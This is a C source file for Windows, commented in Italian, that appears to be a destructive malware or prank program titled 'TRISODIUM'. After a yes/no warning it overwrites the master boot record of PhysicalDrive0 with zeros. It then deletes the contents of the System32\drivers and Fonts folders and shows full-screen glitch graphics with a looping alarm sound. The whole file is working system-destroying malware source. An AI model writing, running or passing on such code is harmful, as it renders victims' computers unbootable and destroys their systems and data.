#include <windows.h>
#include <mmsystem.h>
#include "resource.h"
#include <shlobj.h> // Richiesto per SHGetFolderPathA

#pragma comment(lib, "winmm.lib")

HINSTANCE gInst;

// Funzione ausiliaria per svuotare una directory specifica
void SvuotaCartella(const char* percorsoCartella) {
    char mascheraRicerca[MAX_PATH];
    WIN32_FIND_DATAA fd;
    
    // Crea la maschera per cercare tutti i file (*.*) nella cartella
    wsprintfA(mascheraRicerca, "%s\\*.*", percorsoCartella);
    
    HANDLE hFind = FindFirstFileA(mascheraRicerca, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        // Salta le directory correnti e superiori (. e ..)
        if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
            char percorsoFileCompleto[MAX_PATH];
            wsprintfA(percorsoFileCompleto, "%s\\%s", percorsoCartella, fd.cFileName);

            // Rimuove gli attributi di sola lettura/sistema per permettere la cancellazione
            SetFileAttributesA(percorsoFileCompleto, FILE_ATTRIBUTE_NORMAL);
            
            // Cancella il file (fallisce se è una sottocartella o se è un file bloccato dal kernel)
            DeleteFileA(percorsoFileCompleto);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

// Funzione principale per la distruzione dei file di sistema
void CancellaDriverEFonts() {
    char percorsoWindows[MAX_PATH];
    char percorsoDrivers[MAX_PATH];
    char percorsoFonts[MAX_PATH];

    // Ottiene il percorso della cartella principale di Windows (es. C:\Windows)
    if (GetWindowsDirectoryA(percorsoWindows, MAX_PATH) > 0) {
        // Costruisce i percorsi assoluti per i Drivers e per i Fonts
        wsprintfA(percorsoDrivers, "%s\\System32\\drivers", percorsoWindows);
        wsprintfA(percorsoFonts, "%s\\Fonts", percorsoWindows);

        // Esegue la cancellazione dei file contenuti nelle rispettive directory
        SvuotaCartella(percorsoDrivers);
        SvuotaCartella(percorsoFonts);
    }
}

void OverwriteMBR() {
    HANDLE hDrive;
    DWORD bytesWritten;
    unsigned char mbrBuffer[512] = { 0 }; 

    hDrive = CreateFileA(
        "\\\\.\\PhysicalDrive0",           
        GENERIC_READ | GENERIC_WRITE,     
        FILE_SHARE_READ | FILE_SHARE_WRITE,  
        NULL, 
        OPEN_EXISTING,                    
        0, 
        NULL
    );

    if (hDrive == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Impossibile accedere al disco. Esegui come Amministratore.", "Errore", MB_OK | MB_ICONERROR);
        return;
    }
  
    SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);
   
    if (WriteFile(hDrive, mbrBuffer, 512, &bytesWritten, NULL)) {
        MessageBoxA(NULL, "MBR corrotto con successo. Il sistema non si avvierà al prossimo riavvio.", "Info", MB_OK | MB_ICONINFORMATION);
    } else {
        MessageBoxA(NULL, "Scrittura fallita sul disco.", "Errore", MB_OK | MB_ICONERROR);
    }

    CloseHandle(hDrive);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_KEYDOWN: 
        if (wParam == VK_ESCAPE)
            PostQuitMessage(0);
        return 0;

    case WM_PAINT: { 
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);

        RECT r;
        GetClientRect(hWnd, &r);

        PatBlt(hdc, 0, 0, r.right, r.bottom, DSTINVERT);

        BitBlt(hdc, 5, 0, r.right, r.bottom, hdc, 0, 0, SRCINVERT);
        BitBlt(hdc, -5, 0, r.right, r.bottom, hdc, 0, 0, SRCINVERT);

        for (int x = 0; x < r.right; x += 2) {
            int drop = rand() % 20;
            BitBlt(hdc, x, drop, 2, r.bottom - drop, hdc, x, 0, SRCCOPY);
        }

        EndPaint(hWnd, &ps);
        return 0;
    }

    case WM_DESTROY: 
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
    gInst = hInst;

    // Gestione della risposta dell'utente (SI/NO)
    int risposta = MessageBoxA(NULL,
        "Questo programma corromperà l'MBR, i Drivers e i Fonts, rendendo Windows del tutto inutilizzabile.\nVuoi continuare?",
        "ATTENZIONE: Distruzione Sistema", 
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2); 

    // Se seleziona NO, termina l'esecuzione
    if (risposta == IDNO) {
        return 0; 
    }

    // Se seleziona SI, esegue le azioni distruttive
    OverwriteMBR();
    CancellaDriverEFonts();

    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = "TRISODIUM_SAFE"; 
    RegisterClassA(&wc);

    HWND hWnd = CreateWindowExA(
        WS_EX_TOPMOST,
        wc.lpszClassName,
        "", 
        WS_POPUP,
        0, 0,
        GetSystemMetrics(SM_CXSCREEN),
        GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInst, NULL
    );

    ShowWindow(hWnd, SW_SHOW);

    PlaySoundA(MAKEINTRESOURCEA(IDR_ALERT), hInst, SND_RESOURCE | SND_ASYNC | SND_LOOP);

    MSG msg;
    while (1) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT)
                return 0;

            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        InvalidateRect(hWnd, NULL, FALSE);
        Sleep(30);
    }
}
